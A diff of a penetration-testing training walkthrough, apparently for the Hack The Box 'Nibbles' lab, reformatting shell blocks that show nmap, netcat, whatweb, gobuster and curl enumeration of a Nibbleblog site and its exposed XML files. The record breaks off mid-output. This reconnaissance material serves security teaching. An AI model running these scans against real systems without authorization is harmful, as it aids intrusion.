@@ -2229,7 +2229,15 @@ Let us begin with a quick `nmap` scan to look for open ports using the command `
 Nibbles - Enumeration
 
 ```shell
-6165@htb[/htb]$ nmap -v -oG - # Nmap 7.80 scan initiated Wed Dec 16 23:22:26 2020 as: nmap -v -oG - # Ports scanned: TCP(1000;1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389) UDP(0;) SCTP(0;) PROTOCOLS(0;) WARNING: No targets were specified, so 0 hosts scanned. # Nmap done at Wed Dec 16 23:22:26 2020 -- 0 IP addresses (0 hosts up) scanned in 0.04 seconds
+6165@htb[/htb]$ nmap -v -oG -
+
+# Nmap 7.80 scan initiated Wed Dec 16 23:22:26 2020 as: nmap -v -oG -
+
+# Ports scanned: TCP(1000;1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+
+WARNING: No targets were specified, so 0 hosts scanned.
+
+# Nmap done at Wed Dec 16 23:22:26 2020 -- 0 IP addresses (0 hosts up) scanned in 0.04 seconds
 ```
 
 Finally, we will output all scan formats using `-oA`. This includes XML output, greppable output, and text output that may be useful to us later. It is essential to get in the habit of taking extensive notes and saving all console output early on. The better we get at this while practicing, the more second nature it will become when on real-world engagements. Proper notetaking is critical for us as penetration testers and will significantly speed up the reporting process and ensure no evidence is lost. It is also essential to keep detailed time-stamped logs of scanning and exploitation attempts in an outage or incident in which the client needs information about our activities.
@@ -2237,7 +2245,13 @@ Finally, we will output all scan formats using `-oA`. This includes XML output, 
 Nibbles - Enumeration
 
 ```shell
-6165@htb[/htb]$ nmap -sV --open -oA nibbles_initial_scan 10.129.42.190 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:18 EST Nmap scan report for 10.129.42.190 Host is up (0.11s latency). Not shown: 991 closed ports, 7 filtered ports Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd <REDACTED> ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.82 seconds
+6165@htb[/htb]$ nmap -sV --open -oA nibbles_initial_scan 10.129.42.190
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:18 EST
+
+Nmap scan report for 10.129.42.190 Host is up (0.11s latency). Not shown: 991 closed ports, 7 filtered ports Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd <REDACTED> ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.82 seconds
 ```
 
 From the initial scan output, we can see that the host is likely Ubuntu Linux and exposes an Apache web server on port 80 and an OpenSSH server on port 22. SSH, or [Secure Shell](https://en.wikipedia.org/wiki/SSH_(Secure_Shell)), is a protocol typically used for remote access to Linux/Unix hosts. SSH can also be used to access Windows host and is now native to Windows 10 since version 1809. We can also see that all three types of scan output were created in our working directory.
@@ -2245,7 +2259,9 @@ From the initial scan output, we can see that the host is likely Ubuntu Linux an
 Nibbles - Enumeration
 
 ```shell
-6165@htb[/htb]$ ls nibbles_initial_scan.gnmap nibbles_initial_scan.nmap nibbles_initial_scan.xml
+6165@htb[/htb]$ ls
+
+nibbles_initial_scan.gnmap nibbles_initial_scan.nmap nibbles_initial_scan.xml
 ```
 
 Before we start poking around at the open ports, we can run a full TCP port scan using the command `nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190`. This will check for any services running on non-standard ports that our initial can may have missed. Since this scans all 65,535 TCP ports, it can take a long time to finish depending on the network. We can leave this running in the background and move on with our enumeration. Using `nc` to do some banner grabbing confirms what `nmap` told us; the target is running an Apache web server and an OpenSSH server.
@@ -2253,13 +2269,17 @@ Before we start poking around at the open ports, we can run a full TCP port scan
 Nibbles - Enumeration
 
 ```shell
-6165@htb[/htb]$ nc -nv 10.129.42.190 22 (UNKNOWN) [10.129.42.190] 22 (ssh) open SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
+6165@htb[/htb]$ nc -nv 10.129.42.190 22
+
+(UNKNOWN) [10.129.42.190] 22 (ssh) open SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
 ```
 
 Nibbles - Enumeration
 
 ```shell
-6165@htb[/htb]$ nc -nv 10.129.42.190 80 (UNKNOWN) [10.129.42.190] 80 (http) open
+6165@htb[/htb]$ nc -nv 10.129.42.190 80
+
+(UNKNOWN) [10.129.42.190] 80 (http) open
 ```
 
 Checking our other terminal window, we can see that the full port scan (`-p-`) has finished and has not found any additional ports. Let's do perform an `nmap` [script](https://nmap.org/book/man-nse.html) scan using the `-sC` flag. This flag uses the default scripts, which are listed [here](https://nmap.org/nsedoc/categories/default.html). These scripts can be intrusive, so it is always important to understand exactly how our tools work. We run the command `nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190`. Since we already know which ports are open, we can save time and limit unnecessary scanner traffic by specifying the target ports with `-p`.
@@ -2267,7 +2287,22 @@ Checking our other terminal window, we can see that the full port scan (`-p-`) h
 Nibbles - Enumeration
 
 ```shell
-6165@htb[/htb]$ nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:39 EST Nmap scan report for 10.129.42.190 Host is up (0.11s latency). PORT STATE SERVICE 22/tcp open ssh | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) 80/tcp open http |_http-title: Site doesn't have a title (text/html). Nmap done: 1 IP address (1 host up) scanned in 4.42 seconds
+6165@htb[/htb]$ nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:39 EST
+Nmap scan report for 10.129.42.190
+Host is up (0.11s latency).
+
+PORT STATE SERVICE
+22/tcp open ssh
+| ssh-hostkey:
+| 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+| 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+80/tcp open http
+|_http-title: Site doesn't have a title (text/html).
+
+Nmap done: 1 IP address (1 host up) scanned in 4.42 seconds
 ```
 
 The script scan did not give us anything handy. Let us round out our `nmap` enumeration using the [http-enum script](https://nmap.org/nsedoc/scripts/http-enum.html), which can be used to enumerate common web application directories. This scan also did not uncover anything useful.
@@ -2275,7 +2310,20 @@ The script scan did not give us anything handy. Let us round out our `nmap` enum
 Nibbles - Enumeration
 
 ```shell
-6165@htb[/htb]$ nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:41 EST Nmap scan report for 10.129.42.190 Host is up (0.11s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd <REDACTED> ((Ubuntu)) |_http-server-header: Apache/<REDACTED> (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
+6165@htb[/htb]$ nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:41 EST
+Nmap scan report for 10.129.42.190
+Host is up (0.11s latency).
+Not shown: 998 closed ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open http Apache httpd <REDACTED> ((Ubuntu))
+|_http-server-header: Apache/<REDACTED> (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
 ```
 
 ---
@@ -2288,7 +2336,9 @@ We can use `whatweb` to try to identify the web application in use.
 Nibbles - Web Footprinting
 
 ```shell
-6165@htb[/htb]$ whatweb 10.129.42.190 http://10.129.42.190 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190]
+6165@htb[/htb]$ whatweb 10.129.42.190 http://10.129.42.190
+
+[200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190]
 ```
 
 This tool does not identify any standard web technologies in use. Browsing to the target in `Firefox` shows us a simple "Hello world!" message.
@@ -2304,7 +2354,11 @@ We can also check this with cURL.
 Nibbles - Web Footprinting
 
 ```shell
-6165@htb[/htb]$ curl http://10.129.42.190 <b>Hello world!</b> <!-- /nibbleblog/ directory. Nothing interesting here! -->
+6165@htb[/htb]$ curl http://10.129.42.190
+
+<b>Hello world!</b>
+
+<!-- /nibbleblog/ directory. Nothing interesting here! -->
 ```
 
 The HTML comment mentions a directory named `nibbleblog`. Let us check this with `whatweb`.
@@ -2312,7 +2366,10 @@ The HTML comment mentions a directory named `nibbleblog`. Let us check this with
 Nibbles - Web Footprinting
 
 ```shell
-6165@htb[/htb]$ whatweb http://10.129.42.190/nibbleblog http://10.129.42.190/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], RedirectLocation[http://10.129.42.190/nibbleblog/], Title[301 Moved Permanently] http://10.129.42.190/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
+6165@htb[/htb]$ whatweb http://10.129.42.190/nibbleblog
+
+http://10.129.42.190/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], RedirectLocation[http://10.129.42.190/nibbleblog/], Title[301 Moved Permanently]
+http://10.129.42.190/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
 ```
 
 Now we are starting to get a better picture of things. We can see some of the technologies in use such as [HTML5](https://en.wikipedia.org/wiki/HTML5), [jQuery](https://en.wikipedia.org/wiki/JQuery), and [PHP](https://en.wikipedia.org/wiki/PHP). We can also see that the site is running [Nibbleblog](https://www.nibbleblog.com/), which is a free blogging engine built using PHP.
@@ -2332,7 +2389,38 @@ Let us use [Gobuster](https://github.com/OJ/gobuster) to be thorough and check f
 Nibbles - Web Footprinting
 
 ```shell
-6165@htb[/htb]$ gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.129.42.190/nibbleblog/ [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/12/17 00:10:47 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /admin (Status: 301) /admin.php (Status: 200) /content (Status: 301) /index.php (Status: 200) /languages (Status: 301) /plugins (Status: 301) /README (Status: 200) /themes (Status: 301) =============================================================== 2020/12/17 00:11:38 Finished ===============================================================
+6165@htb[/htb]$ gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
+
+===============================================================
+
+Gobuster v3.0.1
+
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+
+[+] Url:            http://10.129.42.190/nibbleblog/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/12/17 00:10:47 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/admin (Status: 301)
+/admin.php (Status: 200)
+/content (Status: 301)
+/index.php (Status: 200)
+/languages (Status: 301)
+/plugins (Status: 301)
+/README (Status: 200)
+/themes (Status: 301)
+===============================================================
+2020/12/17 00:11:38 Finished
+===============================================================
 ```
 
 `Gobuster` finishes very quickly and confirms the presence of the `admin.php` page. We can check the `README` page for interesting information, such as the version number.
@@ -2340,7 +2428,33 @@ Nibbles - Web Footprinting
 Nibbles - Web Footprinting
 
 ```shell
-6165@htb[/htb]$ curl http://10.129.42.190/nibbleblog/README ====== Nibbleblog ====== Version: v4.0.3 Codename: Coffee Release date: 2014-04-01 Site: http://www.nibbleblog.com Blog: http://blog.nibbleblog.com Help & Support: http://forum.nibbleblog.com Documentation: http://docs.nibbleblog.com ===== Social ===== * Twitter: http://twitter.com/nibbleblog * Facebook: http://www.facebook.com/nibbleblog * Google+: http://google.com/+nibbleblog ===== System Requirements ===== * PHP v5.2 or higher * PHP module - DOM * PHP module - SimpleXML * PHP module - GD * Directory “content” writable by Apache/PHP <SNIP>
+6165@htb[/htb]$ curl http://10.129.42.190/nibbleblog/README
+
+====== Nibbleblog ======
+Version: v4.0.3
+Codename: Coffee
+Release date: 2014-04-01
+
+Site: http://www.nibbleblog.com
+Blog: http://blog.nibbleblog.com
+Help & Support: http://forum.nibbleblog.com
+Documentation: http://docs.nibbleblog.com
+
+===== Social =====
+
+* Twitter: http://twitter.com/nibbleblog
+* Facebook: http://www.facebook.com/nibbleblog
+* Google+: http://google.com/+nibbleblog
+
+===== System Requirements =====
+
+* PHP v5.2 or higher
+* PHP module - DOM
+* PHP module - SimpleXML
+* PHP module - GD
+* Directory “content” writable by Apache/PHP
+
+<SNIP>
 ```
 
 So we validate that version 4.0.3 is in use, confirming that this version is likely vulnerable to the `Metasploit` module (though this could be an old `README` page). Nothing else interesting pops out at us. Let us check out the admin portal login page.
@@ -2358,7 +2472,24 @@ Browsing to `nibbleblog/content` shows some interesting subdirectories `public`,
 Nibbles - Web Footprinting
 
 ```shell
-6165@htb[/htb]$ curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint --format - <?xml version="1.0" encoding="UTF-8" standalone="yes"?> <users> <user username="admin"> <id type="integer">0</id> <session_fail_count type="integer">2</session_fail_count> <session_date type="integer">1608182184</session_date> </user> <blacklist type="string" ip="10.10.10.1"> <date type="integer">1512964659</date> <fail_count type="integer">1</fail_count> </blacklist> <blacklist type="string" ip="10.10.14.2"> <date type="integer">1608182171</date> <fail_count type="integer">5</fail_count> </blacklist> </users>
+6165@htb[/htb]$ curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<users>
+  <user username="admin">
+    <id type="integer">0</id>
+    <session_fail_count type="integer">2</session_fail_count>
+    <session_date type="integer">1608182184</session_date>
+  </user>
+  <blacklist type="string" ip="10.10.10.1">
+    <date type="integer">1512964659</date>
+    <fail_count type="integer">1</fail_count>
+  </blacklist>
+  <blacklist type="string" ip="10.10.14.2">
+    <date type="integer">1608182171</date>
+    <fail_count type="integer">5</fail_count>
+  </blacklist>
+</users>
 ```
 
 At this point, we have a valid username but no password. Searches of Nibbleblog related documentation show that the password is set during installation, and there is no known default password. Up to this point, have the following pieces of the puzzle:
@@ -2377,7 +2508,29 @@ There are no other ports open, and we did not find any other directories. Which 
 Nibbles - Web Footprinting
 
 ```shell
-6165@htb[/htb]$ gobuster dir -u http://10.129.42.190/ --wordlist /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.129.42.190/ [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/12/17 00:36:55 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.html (Status: 200) /server-status (Status: 403) =============================================================== 2020/12/17 00:37:46 Finished ===============================================================
+6165@htb[/htb]$ gobuster dir -u http://10.129.42.190/ --wordlist /usr/share/dirb/wordlists/common.txt
+
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.129.42.190/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/12/17 00:36:55 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/index.html (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2020/12/17 00:37:46 Finished
+===============================================================
 ```
 
 Taking another look through all of the exposed directories, we find a `config.xml` file.
@@ -2385,7 +2538,48 @@ Taking another look through all of the exposed directories, we find a `config.xm
 Nibbles - Web Footprinting
 
 ```shell
-6165@htb[/htb]$ curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format - <?xml version="1.0" encoding="utf-8" standalone="yes"?> <config> <name type="string">Nibbles</name> <slogan type="string">Yum yum</slogan> <footer type="string">Powered by Nibbleblog</footer> <advanced_post_options type="integer">0</advanced_post_options> <url type="string">http://10.129.42.190/nibbleblog/</url> <path type="string">/nibbleblog/</path> <items_rss type="integer">4</items_rss> <items_page type="integer">6</items_page> <language type="string">en_US</language> <timezone type="string">UTC</timezone> <timestamp_format type="string">%d %B, %Y</timestamp_format> <locale type="string">en_US</locale> <img_resize type="integer">1</img_resize> <img_resize_width type="integer">1000</img_resize_width> <img_resize_height type="integer">600</img_resize_height> <img_resize_quality type="integer">100</img_resize_quality> <img_resize_option type="string">auto</img_resize_option> <img_thumbnail type="integer">1</img_thumbnail> <img_thumbnail_width type="integer">190</img_thumbnail_width> <img_thumbnail_height type="integer">190</img_thumbnail_height> <img_thumbnail_quality type="integer">100</img_thumbnail_quality> <img_thumbnail_option type="string">landscape</img_thumbnail_option> <theme type="string">simpler</theme> <notification_comments type="integer">1</notification_comments> <notification_session_fail type="integer">0</notification_session_fail> <notification_session_start type="integer">0</notification_session_start> <notification_email_to type="string">admin@nibbles.com</notification_email_to> <notification_email_from type="string">noreply@10.10.10.134</notification_email_from> <seo_site_title type="string">Nibbles - Yum yum</seo_site_title> <seo_site_description type="string"/> <seo_keywords type="string"/> <seo_robots type="string"/> <seo_google_code type="string"/> <seo_bing_code type="string"/> <seo_author type="string"/> <friendly_urls type="integer">0</friendly_urls> <default_homepage type="integer">0</default_homepage> </config>
+6165@htb[/htb]$ curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -
+
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<config>
+  <name type="string">Nibbles</name>
+  <slogan type="string">Yum yum</slogan>
+  <footer type="string">Powered by Nibbleblog</footer>
+  <advanced_post_options type="integer">0</advanced_post_options>
+  <url type="string">http://10.129.42.190/nibbleblog/</url>
+  <path type="string">/nibbleblog/</path>
+  <items_rss type="integer">4</items_rss>
+  <items_page type="integer">6</items_page>
+  <language type="string">en_US</language>
+  <timezone type="string">UTC</timezone>
+  <timestamp_format type="string">%d %B, %Y</timestamp_format>
+  <locale type="string">en_US</locale>
+  <img_resize type="integer">1</img_resize>
+  <img_resize_width type="integer">1000</img_resize_width>
+  <img_resize_height type="integer">600</img_resize_height>
+  <img_resize_quality type="integer">100</img_resize_quality>
+  <img_resize_option type="string">auto</img_resize_option>
+  <img_thumbnail type="integer">1</img_thumbnail>
+  <img_thumbnail_width type="integer">190</img_thumbnail_width>
+  <img_thumbnail_height type="integer">190</img_thumbnail_height>
